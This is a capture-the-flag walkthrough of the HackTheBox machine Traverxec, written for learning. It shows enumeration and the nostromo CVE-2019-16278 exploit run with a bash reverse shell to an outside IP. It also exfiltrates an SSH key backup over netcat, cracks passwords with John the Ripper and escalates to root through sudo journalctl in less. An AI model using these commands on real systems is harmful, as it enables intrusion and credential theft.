![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6bd1fabe-e487-4657-90a4-a896dae1d1e7)

https://app.hackthebox.com/machines/Traverxec

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I began the enumeration using a quick rust scan to check for open ports and services:

```bash
sudo rustscan -a 10.10.10.165 -- -sC -sV -vv -oN traver_nmap
```

```Rust
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan results showed two open ports, 22 for SSH and 80 for HTTP. The SSH service is running OpenSSH 7.9p1 on Debian 10, while the HTTP service is running nostromo version 1.9.6.

I then checked the searchsploit database for any available exploits related to nostromo & searchsploit results showed three exploits available for nostromo.:

```bash
searchsploit nostrormo
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f5d6e281-0d88-4215-9b8d-82209ced2dc6)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

After checking the results of serachsploit I observed that only 2 are showing the relevant version & from these 2 only 1 is having python exploit as other one is showing the metasploit exploit.
To not use the metasploit, I downloaded the python exploit & made some changes in the scirpt as it was showing error while running.

After making the necessary changes, I executed the script & observed the results:

```bash
python cve-2019-16278.py 10.10.10.165 80 'cat /etc/passwd'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a24e9815-044f-402b-b87b-7e3d7e90c107)

In the /etc/passwd file I observed 1 user "david".

Moving further to get a reverse shell, I used bash one-liner & executed it using the python script. After the execution I quickly received the reverse shell in my netcat listener. 🙂

```bash
python cve-2019-16278.py 10.10.10.165 80 'bash -c "bash -i >& /dev/tcp/10.10.14.128/53 0>&1"'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3b02ff8a-35ab-4d78-b109-108963928749)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## User access:

Now, I got the initial access as user "www-data" but I still don't have the user flag or sufficient access to read david's file.
To gain access as david, I started looking for manually & in one of the directory "/var/nostromo/conf" I found hashed credential belongs to david.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e1ff9641-baee-4355-91e9-7b302ca5dfb2)

I cracked this hash & gained the cleartext password from it:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9393b618-85b9-4d42-ab73-9fe7db127132)

Using this password I tried to switch to David from www-data & also tried to login via SSH but none of them worked. 😕

I then searched about the nhttpd documentation & found [this](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd):

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/72ae33a3-9e70-4aad-8ce7-9b29691d7f78)

Using the above logic, when I checked for the "~david", I observed that he is having his home dircetory hosted on the web:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/59e62377-8aa1-4308-b5a0-9a6a76c09af9)

Now, when I checked the existing "nhttpd.conf" file I observed the "homedirs_public" folder at "public_www":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e0f70c5c-d579-4147-b234-05aa203a6b15)

So, I moved into the David home directory & tried to list out the files but the current user doesn't have access for the David files, however I was able to cd into "public_www" folder located inside "David" home directory:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0da7de0d-8a8a-4389-b96f-43bd99076013)

While checking the directory, I observed a folder "cd protected-file-area" & in that folder I observed a backup file: "backup-ssh-identity-files.tgz".

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4c5e4650-68d0-4b12-b99c-dfe7ddafa84b)

I transferred this backup file to my kali host using netcat:

```bash
#from the victim machine
nc <kali IP> <Port> < backup-ssh-identity-files.tgz
```
```bash
#from my attacking machine
nc -lnvp <port> > output-file.tgz
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c1d9a98f-87d4-464a-82f9-161c2f05a53d)

Once the transfer is completed I unzipped the file using 'tar' comaand:

```bash
tar xzvf backup-ssh.tgz
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5d34a73a-506f-4158-aba7-65484c993de6)

After unzipping the file I got the "david" home directory which contains ssh private keys.

I changed the SSH private key file permission using "chmod 600" & tried to login with this key. But observed that this key is encrypted & I need password to use this private key as well.

So, I used John The ripper to crack the SSH private key password, using below command:

```bash
ssh2john id_rsa > john_rsa

john john_rsa -w=/usr/share/wordlist/rockyou.txt
```

After conevrting the file into John the ripper format & using the same to crack, I got the clear-text credentials in just few seconds:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4ba889f3-e112-447d-9a71-0b8164880ee8)

After using the cracked credentilas, I was finally able to login to David & fetched the user flag as well. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/280cfb58-a11b-4191-aeca-6c1f3d056cad)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

After gaining the access of David I started looking at the other files in David's home directory & I observed a file in the /bin folder "server-stats.sh"

File contains below code:

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
In the last of the code we can see that it's running "journalctl" command with sudo privileges. I checked the GtfoBins for "journalctl" & obsred that it invokes the default pager, which is likely to be less, other functions may apply.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/82e18d27-9f92-4b39-9061-eebf8a005267)

While running the last line of code manually, it isn't loading the less pager.

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

I tried multiple time to load less pager in different way but everytime the service is getting started without opening the less pager, then in the end I thought to just minimze my terminal winodw size so, that the command won't be able to get sufficient 5 lines to display the results.

And, this actually worked as this loaded the less pager in the terminal:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9bad58f8-959c-4da0-92c5-ec0930d0af18)

Once this less pager is loaded I just executed the "!/bin/bash" to load the bash shell. Which then loaded the shell as a root user. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f553be3b-5da0-439f-9bf8-9595058a95ad)

